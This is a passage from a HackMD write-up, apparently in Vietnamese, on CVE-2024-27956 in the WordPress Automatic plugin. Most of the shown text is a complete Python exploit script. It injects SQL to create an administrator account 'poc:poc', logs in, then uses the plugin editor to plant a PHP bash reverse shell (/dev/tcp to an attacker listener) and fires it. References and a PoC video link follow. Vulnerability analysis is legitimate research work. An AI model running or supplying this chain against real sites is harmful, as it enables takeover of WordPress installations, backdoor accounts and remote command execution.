headers = {<span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0"</span>, <span class="hljs-string">"Accept"</span>: <span class="hljs-string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span>, <span class="hljs-string">"Accept-Language"</span>: <span class="hljs-string">"en-US,en;q=0.5"</span>, <span class="hljs-string">"Accept-Encoding"</span>: <span class="hljs-string">"gzip, deflate, br"</span>, <span class="hljs-string">"Connection"</span>: <span class="hljs-string">"close"</span>, <span class="hljs-string">"Upgrade-Insecure-Requests"</span>: <span class="hljs-string">"11"</span>, <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded"</span>}

<span class="hljs-comment"># INSERT new user</span>
data = {<span class="hljs-string">"q"</span>: <span class="hljs-string">"INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status) VALUES ('poc', MD5('poc'), 'poc', 'poc@localhost.org', NOW(), 0)"</span>, <span class="hljs-string">"auth"</span>: <span class="hljs-string">" "</span>, <span class="hljs-string">"integ"</span>: <span class="hljs-string">"2420edd07fd8ceb35f9393e40305f37c"</span>}
r = requests.post(wp_automatic_url, headers=headers, data=data)

<span class="hljs-comment">#Find ID of the user we just insert, change max if you think the ID is bigger than 10</span>
<span class="hljs-built_in">max</span> = <span class="hljs-number">10</span>
<span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>, <span class="hljs-built_in">max</span>):
    data[<span class="hljs-string">"q"</span>] = <span class="hljs-string">"SELECT * FROM `wp_users` WHERE user_login='poc' AND ID="</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>)
    data[<span class="hljs-string">"integ"</span>] = hashlib.md5(data[<span class="hljs-string">"q"</span>].encode()).hexdigest()
    response = requests.post(wp_automatic_url, headers=headers, data=data)
    <span class="hljs-keyword">if</span> <span class="hljs-string">",,,"</span> <span class="hljs-keyword">in</span> response.text:
        <span class="hljs-built_in">id</span> = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>)
        <span class="hljs-keyword">break</span>

<span class="hljs-comment">#Add Role Administrator to the user</span>
data[<span class="hljs-string">"q"</span>] = <span class="hljs-string">"INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ("</span> + <span class="hljs-built_in">id</span> + <span class="hljs-string">", 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}'), ("</span> + <span class="hljs-built_in">id</span> + <span class="hljs-string">", 'wp_user_level', '10')"</span>
data[<span class="hljs-string">"integ"</span>] = hashlib.md5(data[<span class="hljs-string">"q"</span>].encode()).hexdigest()
r = requests.post(wp_automatic_url, headers=headers, data=data)

<span class="hljs-built_in">print</span>(<span class="hljs-string">'Successfully add Administrator account poc:poc'</span>)

<span class="hljs-comment"># Login </span>
login_url = domain + <span class="hljs-string">"/wp-login.php"</span>
headers = {<span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0"</span>, <span class="hljs-string">"Accept"</span>: <span class="hljs-string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span>, <span class="hljs-string">"Accept-Language"</span>: <span class="hljs-string">"en-US,en;q=0.5"</span>, <span class="hljs-string">"Accept-Encoding"</span>: <span class="hljs-string">"gzip, deflate, br"</span>, <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded"</span>, <span class="hljs-string">"Origin"</span>: <span class="hljs-string">"http://localhost"</span>, <span class="hljs-string">"Connection"</span>: <span class="hljs-string">"close"</span>, <span class="hljs-string">"Upgrade-Insecure-Requests"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"Sec-Fetch-Dest"</span>: <span class="hljs-string">"document"</span>, <span class="hljs-string">"Sec-Fetch-Mode"</span>: <span class="hljs-string">"navigate"</span>, <span class="hljs-string">"Sec-Fetch-Site"</span>: <span class="hljs-string">"same-origin"</span>, <span class="hljs-string">"Sec-Fetch-User"</span>: <span class="hljs-string">"?1"</span>}
data = {<span class="hljs-string">"log"</span>: <span class="hljs-string">"poc"</span>, <span class="hljs-string">"pwd"</span>: <span class="hljs-string">"poc"</span>, <span class="hljs-string">"wp-submit"</span>: <span class="hljs-string">"Log In"</span>, <span class="hljs-string">"redirect_to"</span>: <span class="hljs-string">"http://localhost/wordpress/wp-admin/users.php"</span>, <span class="hljs-string">"testcookie"</span>: <span class="hljs-string">"1"</span>}
session = requests.session()
session.post(login_url, headers=headers, data=data)

<span class="hljs-comment"># I choose index.php in wp-automatic plugin to upload the shell</span>
<span class="hljs-comment"># You can choose another file by changing the edit_wp_automatic_url</span>
<span class="hljs-comment"># First we need to find the `nonce` </span>
edit_wp_automatic_url = domain + <span class="hljs-string">"/wp-admin/plugin-editor.php?plugin=wp-automatic%2Findex.php&amp;Submit=Select"</span>
headers = {<span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0"</span>, <span class="hljs-string">"Accept"</span>: <span class="hljs-string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span>, <span class="hljs-string">"Accept-Language"</span>: <span class="hljs-string">"en-US,en;q=0.5"</span>, <span class="hljs-string">"Accept-Encoding"</span>: <span class="hljs-string">"gzip, deflate, br"</span>, <span class="hljs-string">"Connection"</span>: <span class="hljs-string">"close"</span>, <span class="hljs-string">"Upgrade-Insecure-Requests"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"Sec-Fetch-Dest"</span>: <span class="hljs-string">"document"</span>, <span class="hljs-string">"Sec-Fetch-Mode"</span>: <span class="hljs-string">"navigate"</span>, <span class="hljs-string">"Sec-Fetch-Site"</span>: <span class="hljs-string">"none"</span>, <span class="hljs-string">"Sec-Fetch-User"</span>: <span class="hljs-string">"?1"</span>}
r = session.get(edit_wp_automatic_url , headers=headers)

r = r.text.split(<span class="hljs-string">'\n'</span>)
<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> r:
    <span class="hljs-keyword">if</span> <span class="hljs-string">'input type="hidden" id="nonce" name="nonce'</span> <span class="hljs-keyword">in</span> line:
        <span class="hljs-keyword">break</span>
line = line.split(<span class="hljs-string">' '</span>)
nonce = line[<span class="hljs-number">4</span>].replace(<span class="hljs-string">'value="'</span>,<span class="hljs-string">''</span>).replace(<span class="hljs-string">'"'</span>,<span class="hljs-string">''</span>)

<span class="hljs-comment"># Use the `nonce` we just found to upload the shell</span>
<span class="hljs-comment"># You can change payload_data["newcontent"] to another PHP shell if you want</span>
upload_url = domain + <span class="hljs-string">"/wp-admin/admin-ajax.php"</span>
payload_data = {<span class="hljs-string">"nonce"</span>: <span class="hljs-string">"e8876343e3"</span>, <span class="hljs-string">"_wp_http_referer"</span>: <span class="hljs-string">"/wordpress/wp-admin/plugin-editor.php?file=wp-automatic%2Findex.php&amp;plugin=wp-automatic%2Fwp-automatic.php"</span>, <span class="hljs-string">"newcontent"</span>: <span class="hljs-string">"&lt;?php \nexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1414 0&gt;&amp;1'\");\n?&gt;"</span>, <span class="hljs-string">"action"</span>: <span class="hljs-string">"edit-theme-plugin-file"</span>, <span class="hljs-string">"file"</span>: <span class="hljs-string">"wp-automatic/index.php"</span>, <span class="hljs-string">"plugin"</span>: <span class="hljs-string">"wp-automatic/wp-automatic.php"</span>, <span class="hljs-string">"docs-list"</span>: <span class="hljs-string">''</span>}
payload_data[<span class="hljs-string">"nonce"</span>] = nonce
payload_data[<span class="hljs-string">"newcontent"</span>] = <span class="hljs-string">"&lt;?php \nexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/"</span> + listenIP + <span class="hljs-string">"/"</span> + listenPort + <span class="hljs-string">" 0&gt;&amp;1'\");\n?&gt;"</span>

r = session.post(upload_url, data=payload_data)


<span class="hljs-comment">## Visit the link to get the shell</span>
shell_url = <span class="hljs-string">"http://localhost:80/wordpress/wp-content/plugins/wp-automatic/index.php"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Reverse shell is sending"</span>)
r = requests.get(shell_url, headers=headers)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Shell is closed"</span>)
</div></div></code></pre>
      </div><h2 class="part" data-startline="589" data-endline="589" id="POC-Video-clip" data-id="POC-Video-clip"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#POC-Video-clip" title="POC-Video-clip" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="19235" data-size="14">POC Video clip</span></h2><p class="part" data-startline="591" data-endline="591" data-position="19251" data-size="0"><a href="https://drive.google.com/file/d/1KZlFzB7NjET7A7xZd2NfRlL0vufQyF1M/view?usp=sharing" target="_blank" rel="noopener"><span data-position="19251" data-size="82">https://drive.google.com/file/d/1KZlFzB7NjET7A7xZd2NfRlL0vufQyF1M/view?usp=sharing</span></a></p><h2 class="part" data-startline="593" data-endline="593" id="References" data-id="References"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#References" title="References" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="19338" data-size="11">References:</span></h2><ul class="part" data-startline="594" data-endline="601" data-position="19350" data-size="0">
<li class="" data-startline="594" data-endline="594" data-position="19352" data-size="0"><a href="https://github.com/truonghuuphuc/CVE-2024-27956/tree/main" target="_blank" rel="noopener"><span data-position="19352" data-size="57">https://github.com/truonghuuphuc/CVE-2024-27956/tree/main</span></a></li>
<li class="" data-startline="595" data-endline="595" data-position="19412" data-size="0"><a href="https://twitter.com/MrTuxracer/status/1784229071460692232?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Etweet" target="_blank" rel="noopener"><span data-position="19412" data-size="101">https://twitter.com/MrTuxracer/status/1784229071460692232?ref_src=twsrc^google|twcamp^serp|twgr^tweet</span></a></li>
<li class="" data-startline="596" data-endline="596" data-position="19526" data-size="0"><a href="https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin/" target="_blank" rel="noopener"><span data-position="19526" data-size="95">https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin/</span></a></li>
<li class="" data-startline="597" data-endline="597" data-position="19624" data-size="0"><a href="https://thereviewhive.blog/wp-automatic-plugin-patch-now-for-critical-flaw-cve-2024-27956/" target="_blank" rel="noopener"><span data-position="19624" data-size="90">https://thereviewhive.blog/wp-automatic-plugin-patch-now-for-critical-flaw-cve-2024-27956/</span></a></li>
<li class="" data-startline="598" data-endline="598" data-position="19717" data-size="0"><a href="https://secnhack.in/upload-shell-on-wordpress-site/" target="_blank" rel="noopener"><span data-position="19717" data-size="51">https://secnhack.in/upload-shell-on-wordpress-site/</span></a></li>
<li class="" data-startline="599" data-endline="599" data-position="19771" data-size="0"><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener"><span data-position="19771" data-size="84">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</span></a></li>
<li class="" data-startline="600" data-endline="601" data-position="19858" data-size="0"><a href="https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell" target="_blank" rel="noopener"><span data-position="19858" data-size="68">https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell</span></a></li>
</ul></div></div><div class="document-footer container-fluid hmd-pb-2 hidden-print"><div class="-mb-5 flex items-center justify-end text-right text-3 text-text-subtle"><span>Last changed by&nbsp;</span><span class="ui-lastchangeuser h-[18px]" data-profile="cheese00" data-placement="left" data-name="Chi Lam"><a class="ui-user-icon m-0 inline-block h-[18px] w-[18px] user-card-popover" target="_blank" href="https://hackmd.io/@cheese00" data-toggle="popover" style="background-image: url(&quot;https://lh3.googleusercontent.com/a/AEdFTp75QFCKqWg1h3OfyDxwp8XpZM01izYsx18ZvSqm=s96-c&quot;);" data-original-title="" title=""></a></span></div><hr class="my-[30px]"><div class="footer hmd-items-center flex flex-col-reverse gap-[25px] sm:flex-row sm:gap-0"><div class="block h-full flex-1"><div class="relative flex gap-3 text-text-subtle"><span class="flex items-start justify-center ui-owner" data-placement="top" data-profile="cheese00"> <a class="ui-user-icon m-0 inline-block h-10 w-10 min-w-10 user-card-popover" target="_blank" href="https://hackmd.io/@cheese00" data-toggle="popover" style="background-image: url(&quot;https://lh3.googleusercontent.com/a/AEdFTp75QFCKqWg1h3OfyDxwp8XpZM01izYsx18ZvSqm=s96-c&quot;);" data-original-title="" title=""></a></span><div class="flex max-w-[303px] flex-col items-start justify-center gap-1.5"><div class="w-full break-words"><a class="cursor-pointer text-normal font-semibold leading-normal text-text-emphasize hocus:text-link-text-hover hocus:underline ui-owner user-card-popover" data-placement="top" data-profile="cheese00" href="https://hackmd.io/@cheese00" data-toggle="popover" data-original-title="" title="">Chi Lam</a><div class="follow-button-container inline" data-signin="false"><span class="mx-1"><span class="mr-1">·</span><button class="bg-transparent border-none p-0 font-semibold text-text-subtle ui-signin">Follow</button></span></div></div><span class="w-full break-words text-sm text-text-subtle"></span></div></div></div><div class="footer__views"><div class="flex flex-col gap-2.5"><div class="flex flex-row justify-around gap-[7px]"><div class="community-button ui-comment-counts flex items-center justify-center gap-[5px] text-5" title="" data-toggle="tooltip" data-placement="top" data-offset="0,5" data-original-title="0 comments"><i class="ph-fill ph-chat-circle-dots"></i><span>0</span></div><a class="community-button" title="" data-toggle="tooltip" data-placement="top" data-offset="0,5" type="button" href="https://hackmd.io/@cheese00/r1hYa0hZA#" data-original-title="Like"><i class="ph ph-heart"></i><span class="count"></span></a><div class="community-button ui-viewcount" title="" data-toggle="tooltip" data-placement="top" data-offset="0,5" data-original-title="1415 views"><i class="ph ph-eye"></i><span class="count">1415</span></div><a class="community-button" title="" data-toggle="tooltip" data-placement="top" data-offset="0,5" type="button" href="https://hackmd.io/@cheese00/r1hYa0hZA#" data-original-title="Bookmark"><i class="ph ph-bookmark-simple"></i></a></div></div></div></div><section id="notes-recommendations"><hr class="my-[30px]"><h3 class="mx-0 mb-[35px] text-lg font-semibold leading-[135%] text-text-subtle">Read more</h3><div class="flex flex-col gap-5 sm:grid sm:grid-cols-2"><a class="ui-recommendation-note border-0 border-b border-solid border-border-default pb-7.5 hover:no-underline focus:no-underline active:no-underline" href="https://hackmd.io/@cheese00/H1U4Vu6sJe?utm_source=preview-mode&amp;utm_medium=rec" target="_blank" rel="noopener noreferrer"><h5 class="my-0 mb-[5px] text-lg font-semibold leading-lg text-text-default">HTB Blind XSS</h5><p class="mb-0 break-words text-sm leading-sm text-text-subtle line-clamp-2">``</p><small class="mt-3 text-xs font-medium leading-xs text-text-subtle" data-moment="2025-03-12T03:59:04.502Z">Mar 12, 2025</small></a><a class="ui-recommendation-note border-0 border-b border-solid border-border-default pb-7.5 hover:no-underline focus:no-underline active:no-underline" href="https://hackmd.io/@cheese00/H1iiwxC_1e?utm_source=preview-mode&amp;utm_medium=rec" target="_blank" rel="noopener noreferrer"><h5 class="my-0 mb-[5px] text-lg font-semibold leading-lg text-text-default">Flag Command</h5><p class="mb-0 break-words text-sm leading-sm text-text-subtle line-clamp-2">Embark on the "Dimensional Escape Quest" where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!</p><small class="mt-3 text-xs font-medium leading-xs text-text-subtle" data-moment="2025-02-04T10:18:45.448Z">Feb 4, 2025</small></a><a class="ui-recommendation-note border-0 border-b border-solid border-border-default pb-7.5 hover:no-underline focus:no-underline active:no-underline" href="https://hackmd.io/@cheese00/Hk0jGh38yx?utm_source=preview-mode&amp;utm_medium=rec" target="_blank" rel="noopener noreferrer"><h5 class="my-0 mb-[5px] text-lg font-semibold leading-lg text-text-default">Custom Terminal</h5><p class="mb-0 break-words text-sm leading-sm text-text-subtle line-clamp-2">Vào một ngày đẹp trời mình đã quá mệt mỏi với terminal trắng đen của Mac nên mình đã tìm cách để custom nó</p><small class="mt-3 text-xs font-medium leading-xs text-text-subtle" data-moment="2025-01-09T03:53:02.771Z">Jan 9, 2025</small></a><a class="ui-recommendation-note border-0 border-b border-solid border-border-default pb-7.5 hover:no-underline focus:no-underline active:no-underline" href="https://hackmd.io/@cheese00/SyyVhNpnR?utm_source=preview-mode&amp;utm_medium=rec" target="_blank" rel="noopener noreferrer"><h5 class="my-0 mb-[5px] text-lg font-semibold leading-lg text-text-default">Tui làm lab XSS</h5><p class="mb-0 break-words text-sm leading-sm text-text-subtle line-clamp-2">Một ngày đẹp trời vì thấy mình quá gà khi gặp các lỗi XSS nên mình quyết định tìm kiếm thêm các lab XSS để làm và đây là trang mình sẽ dùng để tu luyện thêm kỹ năng XSS của bản thân. Okie Gẹt Gô</p><small class="mt-3 text-xs font-medium leading-xs text-text-subtle" data-moment="2024-09-23T08:27:10.281Z">Sep 23, 2024</small></a></div><div class="mt-[35px] break-words text-center"><a class="ui-recommendation-read-more max-w-full whitespace-normal break-words [text-wrap:balance] flex justify-center items-center px-3 py-2 mx-auto text-normal leading-normal text-text-default bg-background-default rounded border border-solid border-border-default hocus:bg-element-bg-hover hocus:text-text-emphasize hocus:no-underline" href="https://hackmd.io/@cheese00?utm_source=preview-mode&amp;utm_medium=rec" target="_blank" rel="noopener noreferrer">Read more from Chi Lam</a></div></section><hr class="mt-7.5 mb-3.5"><div class="footer text-center text-sm leading-sm text-text-subtle"><span>Published on</span> <strong><a href="https://hackmd.io/" target="_blank"><img class="h-5 w-auto" src="./Phân tích CVE-2024-27956 - HackMD_files/Logo.svg"> <span class="brand">HackMD</span></a></strong></div></div><div class="ui-community unselectable hidden-print hidden-xs" style="visibility: visible; left: 312.286px;"><a class="community-button" title="" data-toggle="tooltip" data-placement="right" data-offset="0,5" type="button" href="https://hackmd.io/@cheese00/r1hYa0hZA#" data-original-title="Like"><i class="ph ph-heart"></i><span class="count"></span></a><a class="community-button" title="" data-toggle="tooltip" data-placement="right" data-offset="0,5" type="button" href="https://hackmd.io/@cheese00/r1hYa0hZA#" data-original-title="Bookmark"><i class="ph ph-bookmark-simple"></i></a><a class="community-button" href="https://hackmd.io/@cheese00/r1hYa0hZA#"><i class="ph ph-bell"></i></a></div><div class="ui-toc dropup unselectable hidden-print" style="display: none; left: 312.786px; visibility: visible;"><div class="pull-left dropdown"><a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="https://hackmd.io/@cheese00/r1hYa0hZA#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content"><i class="fa fa-bars"></i></a><ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel" lang="en-US"><div class="toc"><ul class="nav">
<li class="active"><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Ph%C3%A2n-t%C3%ADch-CVE-2024-27956" title="Phân tích CVE-2024-27956" smoothhashscroll="">Phân tích CVE-2024-27956</a><ul class="nav">
<li><a href="https://hackmd.io/@cheese00/r1hYa0hZA#T%C3%B3m-t%E1%BA%AFt" title="Tóm tắt" smoothhashscroll="">Tóm tắt</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Set-up-m%C3%B4i-tr%C6%B0%E1%BB%9Dng-%C4%91%E1%BB%83-ph%C3%A2n-t%C3%ADch" title="Set up môi trường để phân tích" smoothhashscroll="">Set up môi trường để phân tích</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Sink" title="Sink" smoothhashscroll="">Sink</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Ph%C3%A2n-t%C3%ADch" title="Phân tích" smoothhashscroll="">Phân tích</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Payload" title="Payload" smoothhashscroll="">Payload</a><ul class="nav">
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Ki%E1%BB%83m-tra-l%E1%BB%97-h%E1%BB%95ng" title="Kiểm tra lỗ hổng" smoothhashscroll="">Kiểm tra lỗ hổng</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#T%E1%BA%A1o-m%E1%BB%99t-user-Wordpress-m%E1%BB%9Bi" title="Tạo một user Wordpress mới" smoothhashscroll="">Tạo một user Wordpress mới</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Ki%E1%BB%83m-tra-user-v%E1%BB%ABa-t%E1%BA%A1o-t%E1%BB%93n-t%E1%BA%A1i-trong-table" title="Kiểm tra user vừa tạo tồn tại trong table" smoothhashscroll="">Kiểm tra user vừa tạo tồn tại trong table</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#X%C3%A1c-%C4%91%E1%BB%8Bnh-user-id" title="Xác định user id" smoothhashscroll="">Xác định user id</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Th%C3%AAm-quy%E1%BB%81n-admin-cho-user-v%E1%BB%ABa-t%E1%BA%A1o" title="Thêm quyền admin cho user vừa tạo" smoothhashscroll="">Thêm quyền admin cho user vừa tạo</a></li>
</ul>
</li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Upload-reverse-shell" title="Upload reverse shell" smoothhashscroll="">Upload reverse shell</a><ul class="nav">
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Upload-plugin-or-template" title="Upload plugin or template" smoothhashscroll="">Upload plugin or template</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Plugin-file-editor-or-Theme-file-editor" title="Plugin file editor or Theme file editor" smoothhashscroll="">Plugin file editor or Theme file editor</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#T%E1%BB%B1-t%E1%BA%A1o-m%E1%BB%99t-plugin-reverse-shell" title="Tự tạo một plugin reverse shell" smoothhashscroll="">Tự tạo một plugin reverse shell</a></li>
</ul>
</li>
<li class="active"><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Script-auto-exploit" title="Script auto exploit" smoothhashscroll="">Script auto exploit</a></li>
<li><a href="https://hackmd.io/@cheese00/r1hYa0hZA#POC-Video-clip" title="POC Video clip" smoothhashscroll="">POC Video clip</a></li>
<li><a href="https://hackmd.io/@cheese00/r1hYa0hZA#References" title="References:" smoothhashscroll="">References:</a></li>
</ul>
</li>
</ul>
</div><div class="toc-menu"><a class="expand-toggle" href="https://hackmd.io/@cheese00/r1hYa0hZA#">Expand all</a><a class="back-to-top" href="https://hackmd.io/@cheese00/r1hYa0hZA#">Back to top</a><a class="go-to-bottom" href="https://hackmd.io/@cheese00/r1hYa0hZA#">Go to bottom</a></div></ul></div></div><div class="toc-placeholder hidden"></div><div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print affix" data-spy="affix" lang="en-US" style="max-width: min(350.286px, 15vw); top: 162.999px; right: 1103.29px;"><div class="toc"><ul class="nav">
<li class="active"><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Ph%C3%A2n-t%C3%ADch-CVE-2024-27956" title="Phân tích CVE-2024-27956" smoothhashscroll="">Phân tích CVE-2024-27956</a><ul class="nav">
<li><a href="https://hackmd.io/@cheese00/r1hYa0hZA#T%C3%B3m-t%E1%BA%AFt" title="Tóm tắt" smoothhashscroll="">Tóm tắt</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Set-up-m%C3%B4i-tr%C6%B0%E1%BB%9Dng-%C4%91%E1%BB%83-ph%C3%A2n-t%C3%ADch" title="Set up môi trường để phân tích" smoothhashscroll="">Set up môi trường để phân tích</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Sink" title="Sink" smoothhashscroll="">Sink</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Ph%C3%A2n-t%C3%ADch" title="Phân tích" smoothhashscroll="">Phân tích</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Payload" title="Payload" smoothhashscroll="">Payload</a><ul class="nav">
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Ki%E1%BB%83m-tra-l%E1%BB%97-h%E1%BB%95ng" title="Kiểm tra lỗ hổng" smoothhashscroll="">Kiểm tra lỗ hổng</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#T%E1%BA%A1o-m%E1%BB%99t-user-Wordpress-m%E1%BB%9Bi" title="Tạo một user Wordpress mới" smoothhashscroll="">Tạo một user Wordpress mới</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Ki%E1%BB%83m-tra-user-v%E1%BB%ABa-t%E1%BA%A1o-t%E1%BB%93n-t%E1%BA%A1i-trong-table" title="Kiểm tra user vừa tạo tồn tại trong table" smoothhashscroll="">Kiểm tra user vừa tạo tồn tại trong table</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#X%C3%A1c-%C4%91%E1%BB%8Bnh-user-id" title="Xác định user id" smoothhashscroll="">Xác định user id</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Th%C3%AAm-quy%E1%BB%81n-admin-cho-user-v%E1%BB%ABa-t%E1%BA%A1o" title="Thêm quyền admin cho user vừa tạo" smoothhashscroll="">Thêm quyền admin cho user vừa tạo</a></li>
</ul>
</li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Upload-reverse-shell" title="Upload reverse shell" smoothhashscroll="">Upload reverse shell</a><ul class="nav">
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Upload-plugin-or-template" title="Upload plugin or template" smoothhashscroll="">Upload plugin or template</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Plugin-file-editor-or-Theme-file-editor" title="Plugin file editor or Theme file editor" smoothhashscroll="">Plugin file editor or Theme file editor</a></li>
<li class=""><a href="https://hackmd.io/@cheese00/r1hYa0hZA#T%E1%BB%B1-t%E1%BA%A1o-m%E1%BB%99t-plugin-reverse-shell" title="Tự tạo một plugin reverse shell" smoothhashscroll="">Tự tạo một plugin reverse shell</a></li>
</ul>
</li>
<li class="active"><a href="https://hackmd.io/@cheese00/r1hYa0hZA#Script-auto-exploit" title="Script auto exploit" smoothhashscroll="">Script auto exploit</a></li>
<li><a href="https://hackmd.io/@cheese00/r1hYa0hZA#POC-Video-clip" title="POC Video clip" smoothhashscroll="">POC Video clip</a></li>
<li><a href="https://hackmd.io/@cheese00/r1hYa0hZA#References" title="References:" smoothhashscroll="">References:</a></li>
</ul>
</li>
</ul>
</div><div class="toc-menu"><a class="expand-toggle" href="https://hackmd.io/@cheese00/r1hYa0hZA#">Expand all</a><a class="back-to-top" href="https://hackmd.io/@cheese00/r1hYa0hZA#">Back to top</a><a class="go-to-bottom" href="https://hackmd.io/@cheese00/r1hYa0hZA#">Go to bottom</a></div></div><div class="clearfix"></div><div id="floating-toolbar" class="relative md:fixed" style="display: none;"><div><a class="pointer-events-none fixed hidden" type="button" aria-haspopup="dialog" aria-expanded="true" aria-controls="radix-1" data-state="open"></a></div></div></div>
    <!-- signin modal -->

<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true" theme="light">
    <div class="modal-dialog">
        <div class="modal-content">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">×</span></button>
            






    









<h3>Sign in</h3>

<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded" id="signin-form" novalidate="true">
    <div class="hmd-dn"><input type="hidden" name="_csrf" value="ejFWFIep-unkOjvkGHVbuTENyYTGR1uA7wG0"></div>
    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
    
    <div class="form-group  ">
        <label for="email" class="control-label">Email</label>
        <label for="inputEmail" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            
                <input type="email" class="form-control" name="email" placeholder="Your email" required="" autocomplete="email">
            
            <span class="error-sign"></span>
        </div>
    </div>
    <div class="form-group ">
        <label for="password" class="control-label">Password</label>
        <label for="inputPassword" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            <input type="password" class="form-control" name="password" placeholder="Your password" required="" autocomplete="current-password" maxlength="128">
            <span class="error-sign"></span>
            
                <span class="control-label pull-right !text-normal !leading-normal !font-normal !mt-1.5"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
            
        </div>
    </div>

    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
        <div hidden="" id="hmd-captcha" data-provider="" data-captcha-data="" class="flex justify-center"></div>

        
            <input type="submit" class="neo-btn neo-btn-primary !justify-center !py-3.5 !mx-auto w-[180px] text-[18px] disabled" formaction="https://hackmd.io/login" value="Sign in">
        

        
    </div>
</form>














    
        <p class="separator">or</p>
    

    
        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
    

    










